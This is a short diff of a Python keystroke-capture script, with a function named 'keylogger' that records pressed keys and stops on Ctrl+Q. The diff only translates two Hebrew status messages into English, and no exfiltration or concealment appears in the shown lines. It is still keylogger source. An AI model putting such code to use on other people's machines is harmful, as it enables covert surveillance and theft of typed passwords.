@@ -9,7 +9,7 @@ pressed_keys = set()
 def keylogger(key):
  pressed_keys.add(key)
  if Key.ctrl_l in pressed_keys and key == KeyCode.from_char('q'):
-   print("Ctrl + Q נלחצו - עוצר מאזין")
+   print("Ctrl + Q press - stop listener")
    return False
  key = str(key).replace("'", "")
  special_keys = {
@@ -45,7 +45,7 @@ def on_press(key):
  keylogger(key)
  if (Key.ctrl_l in pressed_keys or Key.ctrl_r in pressed_keys) and \
          (key == KeyCode.from_char('q') or KeyCode.from_char('q') in pressed_keys):
-   print("Ctrl + Q נלחצו - מאזין נעצר")
+   print("Ctrl + Q press - stop listener")
    return False
 
 
